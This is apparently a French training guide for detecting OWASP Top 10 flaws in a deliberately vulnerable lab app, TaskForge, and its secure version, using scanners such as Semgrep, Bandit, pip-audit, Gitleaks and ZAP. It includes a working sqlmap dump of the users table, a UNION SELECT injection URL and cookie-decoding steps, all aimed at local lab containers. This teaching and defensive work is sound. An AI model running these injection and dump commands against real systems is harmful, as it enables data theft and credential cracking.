# TaskForge — Démo outillée de détection du Top 10 OWASP 2025

Cette démo montre, **pas à pas et avec conteneurs**, comment détecter chaque
catégorie de l'OWASP Top 10:2025 sur TaskForge, puis comment la version conforme
fait disparaître les alertes.

Les sorties reproduites ci-dessous sont **réelles** : elles ont été obtenues en
exécutant les outils sur le code du lab. Deux outils (OWASP ZAP et
Dependency-Check) n'ont **pas pu être exécutés lors de la préparation** de ce
document (environnement sans démon Docker et sans accès NVD/Maven Central) ; leurs
sections donnent la commande exacte et le résultat attendu, à lancer sur votre
poste. Ces cas sont signalés par la mention **⚠️ à exécuter chez vous**.

---

## 0. Prérequis (étape 0)

- **Docker Desktop** (macOS/Windows) ou **Docker Engine + plugin compose** (Linux)
  - vérifier : `docker --version` et `docker compose version`
- ~4 Go d'espace disque libre (images + bases de vulnérabilités)
- Accès Internet (pour tirer les images et les bases CVE)
- Le dossier du lab décompressé ; **toutes les commandes se lancent depuis sa racine** :
  ```bash
  cd owasp-top10-2025-lab-v1.2
  ```
- ⚠️ **Sécurité** : les services `*-vuln` sont volontairement faillibles et
  embarquent des dépendances à CVE connues. À exécuter uniquement sur un poste
  isolé (réseau du lab), **jamais exposés sur Internet**.

---

## 1. Quel outil pour quelle catégorie

Aucun outil ne couvre seul les 10 catégories. On combine quatre familles :

| Famille | Rôle | Outils de la démo |
|---|---|---|
| **SAST** | analyse du code source | Semgrep, Bandit |
| **SCA** | analyse des dépendances | pip-audit, OWASP Dependency-Check, Trivy |
| **Secrets** | secrets écrits en dur | Gitleaks |
| **DAST** | attaque de l'appli en marche | OWASP ZAP, sqlmap |

Deux catégories restent **hors de portée des outils** et ne se trouvent qu'à la
lecture du code : **A06 (Insecure Design)** et **A10 (Mishandling of Exceptional
Conditions)**. C'est le cœur de l'exercice pédagogique.

---

## 2. Démarrer les quatre applications

```bash
docker compose up -d --build
```

| Service | Rôle | URL |
|---|---|---|
| `python-vuln` | Flask vulnérable | http://localhost:5050 |
| `python-secure` | Flask conforme | http://localhost:5001 |
| `java-vuln` | Spring Boot vulnérable | http://localhost:8080 |
| `java-secure` | Spring Boot conforme | http://localhost:8081 |

Comptes de démonstration :

| Version | admin | alice | bob |
|---|---|---|---|
| **Vulnérable** | `admin` / `admin` | `alice` / `password1` | `bob` / `hunter2` |
| **Conforme** | `admin` / `Admin!Passw0rd` | `alice` / `Alice!Passw0rd` | `bob` / `Bob!Passw0rd42` |

Arrêt en fin de séance :
```bash
docker compose down
```

---

## 3. Construire la boîte à outils SAST/SCA

Une image unique regroupe Semgrep, Bandit, pip-audit et sqlmap :

```bash
docker build -t taskforge-audit -f tools/Dockerfile.audit tools
```

Les autres outils (ZAP, Trivy, Gitleaks, Dependency-Check) s'utilisent
directement via leur image officielle, sans rien construire.

---

## 4. SAST — Semgrep

On utilise le jeu de règles fourni (`tools/semgrep-rules/taskforge.yml`),
étiqueté par catégorie OWASP.

**Scanner la version vulnérable (Python) :**
```bash
docker run --rm -v "$PWD":/work taskforge-audit \
  semgrep scan --config tools/semgrep-rules/taskforge.yml python/vulnerable
```
*(équivalent avec l'image officielle : `docker run --rm -v "$PWD":/src semgrep/semgrep semgrep --config /src/tools/semgrep-rules/taskforge.yml /src/python/vulnerable`)*

**Résultat réel — 11 alertes :**
```
python/vulnerable/app/__init__.py:6   taskforge-python-hardcoded-secret   A04
python/vulnerable/app/__init__.py:25  taskforge-python-cors-wildcard      A02
python/vulnerable/app/__init__.py:33  taskforge-python-weak-hash-md5      A04
python/vulnerable/app/auth.py:16      taskforge-python-weak-hash-md5      A04/A07
python/vulnerable/app/auth.py:30      taskforge-python-try-except-pass    A10
python/vulnerable/app/tasks.py:16     taskforge-python-insecure-deser.    A08
python/vulnerable/app/tasks.py:42     taskforge-python-sql-taint          A05
python/vulnerable/app/tasks.py:74     taskforge-python-try-except-pass    A10
python/vulnerable/app/tasks.py:75     taskforge-python-ssrf-requests      A01
python/vulnerable/run.py:7            taskforge-python-flask-debug        A02
python/vulnerable/seed.py:8           taskforge-python-weak-hash-md5      A04
```

**Scanner la version vulnérable (Java) :**
```bash
docker run --rm -v "$PWD":/work taskforge-audit \
  semgrep scan --config tools/semgrep-rules/taskforge.yml java-spring/vulnerable
```

**Résultat réel — 5 alertes :**
```
.../config/DataLoader.java:24         taskforge-java-weak-hash-md5         A04
.../service/TaskSearchService.java:19 taskforge-java-sql-taint             A05
.../web/AuthController.java:26         taskforge-java-weak-hash-md5         A04/A07
.../web/TaskController.java:43         taskforge-java-insecure-deser.       A08
.../web/TaskController.java:94         taskforge-java-ssrf                  A01
```

**Contraste — les versions conformes :**
```bash
docker run --rm -v "$PWD":/work taskforge-audit \
  semgrep scan --config tools/semgrep-rules/taskforge.yml python/secure java-spring/secure
```
**Résultat réel : `0 Code Findings`** pour les deux. Requêtes paramétrées, plus de
MD5, désérialisation signée, URL validée : les règles ne matchent plus.

> Semgrep attrape ici A01(SSRF), A02, A04, A05, A08 et l'indice A10. Il ne « voit »
> ni A03 (dépendances), ni A07 complet, ni A06 (conception).

---

## 5. SAST — Bandit (Python)

```bash
docker run --rm -v "$PWD":/work taskforge-audit \
  bandit -r python/vulnerable/app
```

**Résultat réel — 8 alertes :**
```
app/__init__.py:6   B105 LOW    Possible hardcoded password: 'taskforge-secret-2024'   A04
app/__init__.py:33  B324 HIGH   Use of weak MD5 hash for security                       A04
app/auth.py:16      B324 HIGH   Use of weak MD5 hash for security                       A04/A07
app/auth.py:35      B110 LOW    Try, Except, Pass detected                              A10
app/tasks.py:2      B403 LOW    Consider security implications of pickle module         A08
app/tasks.py:16     B301 MEDIUM Pickle can be unsafe when deserializing untrusted data  A08
app/tasks.py:41     B608 MEDIUM Possible SQL injection through string construction      A05
app/tasks.py:77     B110 LOW    Try, Except, Pass detected                              A10
```
Sur `python/secure/app` : **aucune alerte**.

> Bandit et Semgrep se recoupent (MD5, pickle, SQLi, except/pass) et se complètent :
> Bandit repère l'`import pickle` (B403), Semgrep relie la donnée HTTP au sink SQL.

---

## 6. SCA Python — pip-audit

```bash
docker run --rm -v "$PWD":/work taskforge-audit \
  pip-audit -r python/vulnerable/requirements.txt
```

**Résultat réel : `Found 57 known vulnerabilities in 7 packages`.**
Extrait des paquets concernés :

| Paquet | Version | Exemples d'avis | Correctif |
|---|---|---|---|
| flask | 2.0.1 | PYSEC-2023-62 (fuite de session via cache) | ≥ 2.2.5 |
| werkzeug | 2.0.1 | PYSEC-2023-58 (DoS multipart), PYSEC-2026-2043 (RCE debugger) | ≥ 2.2.3 / 3.x |
| jinja2 | 3.0.1 | PYSEC-2026-1471…1475 (contournement sandbox, XSS `xmlattr`) | ≥ 3.1.6 |
| requests | 2.25.1 | PYSEC-2023-74 (fuite `Proxy-Authorization`) | ≥ 2.31.0 |
| pyyaml | 5.3.1 | PYSEC-2021-142 (RCE `full_load`) | ≥ 5.4 |
| urllib3 | 1.26.20 | PYSEC-2026-1999 (redirections non désactivées → SSRF) | ≥ 2.5.0 |
| idna | 2.10 | PYSEC-2024-60 (DoS) | ≥ 3.7 |

**Contraste :**
```bash
docker run --rm -v "$PWD":/work taskforge-audit \
  pip-audit -r python/secure/requirements.txt
```
**Résultat réel : `No known vulnerabilities found`** (dépendances à jour).

> Leçon : le SCA n'est jamais « vert pour toujours » — de nouvelles CVE paraissent.
> Il doit tourner en continu (intégration continue), pas une seule fois.

---

## 7. SCA Java — OWASP Dependency-Check / Trivy  ⚠️ à exécuter chez vous

Non exécuté lors de la préparation (Dependency-Check télécharge la base NVD ;
Trivy `fs --scanners vuln` télécharge sa base ; les deux nécessitent un accès
réseau non disponible ici). Commandes à lancer sur votre poste :

```bash
# OWASP Dependency-Check (une clé API NVD gratuite accélère fortement le 1er run)
docker run --rm -v "$PWD/java-spring/vulnerable":/src -v depcheck-data:/usr/share/dependency-check/data \
  owasp/dependency-check --scan /src --format HTML --out /src/depcheck-report \
  --nvdApiKey "$NVD_API_KEY"

# Trivy (dépendances + mauvaises configs + secrets, en un passage)
docker run --rm -v "$PWD/java-spring/vulnerable":/src aquasec/trivy \
  fs --scanners vuln,misconfig,secret /src
```

**Résultat attendu — CVE ciblées par la conception du lab :**

| Dépendance | Version | CVE attendue | Impact |
|---|---|---|---|
| `org.springframework.boot` | 2.7.5 | socle en fin de support, CVE Spring multiples | A03 |
| `org.yaml:snakeyaml` | 1.30 | CVE-2022-1471 (désérialisation → RCE) | A03/A08 |
| `org.apache.commons:commons-text` | 1.9 | CVE-2022-42889 « Text4Shell » (RCE) | A03 |

Sur `java-spring/secure` (Boot 3.3.4, dépendances vulnérables retirées) : plus
d'alerte sur ces composants.

---

## 8. Secrets — Gitleaks

**Configuration par défaut :**
```bash
docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest \
  detect --no-git --source /repo
```
**Résultat réel : `no leaks found`.** Le secret `taskforge-secret-2024` a une
entropie trop faible pour les règles génériques : **les détecteurs de secrets
ratent les secrets applicatifs « maison »**. C'est une limite importante à montrer.

**Avec les règles ciblées fournies (`tools/gitleaks.toml`) :**
```bash
docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest \
  detect --no-git --source /repo --config /repo/tools/gitleaks.toml
```
**Résultat réel : `leaks found: 14`.** Points saillants :
```
taskforge-app-secret  python/vulnerable/app/__init__.py:6           (secret en dur)   A04
taskforge-app-secret  java-spring/.../application.properties:24     (secret en dur)   A04
taskforge-iban-clear  python/vulnerable/seed.py + java .../DataLoader.java  (IBAN démo en clair)
```
Le secret applicatif n'apparaît **que** côté vulnérable (le conforme lit
l'environnement). Les IBAN de démonstration figurent en clair dans les fichiers
de **seed** des deux versions : normal, Gitleaks scanne le code, pas la base — et
c'est l'occasion de parler de la gestion des données de test.

---

## 9. DAST — en-têtes & configuration (baseline manuelle)

Comparaison réelle des en-têtes HTTP (obtenus avec `curl -D -` sur les apps en
marche). C'est ce qu'un scan **ZAP baseline** signale en premier.

| Contrôle | `python-vuln` (5050) | `python-secure` (5001) | Catégorie |
|---|---|---|---|
| Protocole | HTTP/1.0 | HTTP/1.1 | — |
| `Access-Control-Allow-Origin` | `*` | *(absent)* | A02 |
| `Server` | `TaskForge/1.0 Python/3.11 Flask/2.0.1` (bavard) | `Werkzeug/…` (neutre) | A02 |
| `Content-Security-Policy` | *(absent)* | `default-src 'self'; …` | A02 |
| `Strict-Transport-Security` | *(absent)* | `max-age=31536000; includeSubDomains` | A02 |
| `X-Content-Type-Options` | *(absent)* | `nosniff` | A02 |
| `X-Frame-Options` | *(absent)* | `DENY` | A02 |
| `Referrer-Policy` | *(absent)* | `no-referrer` | A02 |
| Cookie de session | `HttpOnly` seul | `HttpOnly; SameSite=Lax` | A02/A08 |
| Jeton CSRF | *(aucun)* | requis (POST sans jeton → **HTTP 400**) | A08 |

Reproduire :
```bash
curl -s -D - -o /dev/null http://localhost:5050/login   # vulnérable
curl -s -D - -o /dev/null http://localhost:5001/login   # conforme
```

**Deux preuves supplémentaires côté vulnérable :**

Cookie « se souvenir de moi » = base64 **réversible** :
```bash
curl -s -i -X POST http://localhost:5050/login \
  -d "username=alice&password=password1&remember=on" | grep -i "remember="
# valeur décodée :
echo 'YWxpY2U6N2M2YTE4MGIzNjg5NmEwYThjMDI3ODdlZWFmYjBlNGM=' | base64 -d
# -> alice:7c6a180b36896a0a8c02787eeafb0e4c   (= alice : md5("password1"))   A04/A07
```

Mot de passe **journalisé en clair** (A09) — visible dans les logs du conteneur :
```bash
docker compose logs python-vuln | grep "pass="
# INFO:taskforge:Tentative de connexion user=alice pass=password1
```

---

## 10. DAST — OWASP ZAP baseline  ⚠️ à exécuter chez vous

Non exécuté lors de la préparation (nécessite le démon Docker et les applications
en marche). Sur votre poste, applications démarrées (§2) :

```bash
# Cible : application vulnérable Python
docker run --rm -v "$PWD/zap":/zap/wrk ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t http://host.docker.internal:5050 -r rapport-python-vuln.html

# Cible : application vulnérable Java
docker run --rm -v "$PWD/zap":/zap/wrk ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t http://host.docker.internal:8080 -r rapport-java-vuln.html
```

**Alertes attendues** (corrélées aux en-têtes réels du §9) : CSP absente,
en-têtes anti-clickjacking/nosniff manquants, cookie sans `SameSite`,
divulgation via l'en-tête `Server`, CORS permissif. Sur les cibles `*-secure`
(ports 5001/8081), ces alertes disparaissent. Le rapport HTML est déposé dans
`./zap/`.

---

## 11. Exploitation — injection SQL avec sqlmap

Démonstration réelle de bout en bout sur l'application vulnérable.

```bash
# 1) S'authentifier et récupérer le cookie de session
curl -s -c cookies.txt -X POST http://localhost:5050/login \
  -d "username=alice&password=password1" -o /dev/null
SESS=$(grep session cookies.txt | awk '{print $7}')

# 2) Lancer sqlmap sur le paramètre de recherche, avec le cookie
docker run --rm -v "$PWD":/work taskforge-audit sqlmap \
  -u "http://host.docker.internal:5050/tasks/search?q=test" \
  --cookie="session=$SESS" --batch --dbms=sqlite --technique=U \
  -T users -C username,password,role,iban --dump
```

**Résultat réel :**
```
GET parameter 'q' is vulnerable.
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
back-end DBMS: SQLite

Table: users
| role  | username | password                                     | iban                        |
| ADMIN | admin    | 21232f297a57a5a743894a0e4a801fc3 (admin)     | FR7630006000011234567890189 |
| USER  | alice    | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | FR1420041010050500013M02606 |
| USER  | bob      | 2ab96390c7dbe3439de74d0c9b0b1767 (hunter2)   | FR7630004000031234567890143 |
```
Deux catégories démontrées d'un coup : **A05** (l'injection permet le dump) et
**A04** (sqlmap reconnaît et **casse** les empreintes MD5, en clair entre
parenthèses). Les IBAN, stockés en clair, sortent aussi.

**Contraste — même attaque sur la version conforme :**
```bash
# (login CSRF requis, puis même requête ?q=… UNION SELECT …)
curl -s -b "session=$SESS_SECURE" \
  "http://localhost:5001/tasks/search?q=zzz'%20UNION%20SELECT%201,username,password,iban%20FROM%20users--%20"
```
**Résultat réel : HTTP 200, aucune donnée exfiltrée.** La valeur est traitée
comme un simple texte de recherche (requête paramétrée) : sqlmap ne trouve aucun
point d'injection.

---

## 12. Récapitulatif : couverture des 10 catégories

| Cat. | Détectée par | Exécuté dans cette démo |
|---|---|---|
| A01 Broken Access Control (SSRF/IDOR) | Semgrep (SSRF) ; IDOR → **manuel** (2 comptes) | ✅ SSRF / IDOR : test manuel |
| A02 Security Misconfiguration | Semgrep, en-têtes §9, ZAP | ✅ (ZAP ⚠️ chez vous) |
| A03 Supply Chain | pip-audit, Dependency-Check, Trivy | ✅ Python / ⚠️ Java |
| A04 Cryptographic Failures | Bandit, Semgrep, sqlmap (MD5 cassé), Gitleaks | ✅ |
| A05 Injection | Semgrep, Bandit, **sqlmap** | ✅ |
| A06 Insecure Design | **revue de code seule** | ➖ manuel |
| A07 Authentication Failures | Semgrep (partiel), §9 (cookie/token) ; brute-force → **manuel** | ✅ partiel |
| A08 Integrity Failures | Bandit/Semgrep (désérialisation), §9 (CSRF) | ✅ |
| A09 Logging Failures | §9 (mot de passe en clair dans les logs) | ✅ |
| A10 Exceptional Conditions | Semgrep/Bandit (indice `except: pass`), **revue** | ✅ indice + manuel |

---

## 13. Déroulé pédagogique conseillé

1. **Lecture de code d'abord** (fiche apprenant) : les apprenants cherchent les 10
   à la main. C'est là qu'ils trouvent A06 et A10, invisibles aux outils.
2. **Puis l'outillage** (cette démo) : ils confirment A02/A03/A04/A05/A08 et voient
   la vitesse des scanners.
3. **Comparer les deux** : ce que les outils ratent (IDOR, mass assignment, reset
   énumérable, conception) = la valeur de l'analyse humaine.
4. **Rejouer sur la version conforme** : les alertes tombent à zéro → on relie
   chaque correctif à sa catégorie.

---

## Annexe — reproduire les résultats hors Docker

Sans Docker, les mêmes sorties s'obtiennent nativement (la sortie d'un scanner ne
dépend pas du conteneur) :
```bash
python3 -m venv .venv && source .venv/bin/activate
pip install semgrep bandit pip-audit sqlmap
semgrep scan --config tools/semgrep-rules/taskforge.yml python/vulnerable
bandit -r python/vulnerable/app
pip-audit -r python/vulnerable/requirements.txt
```
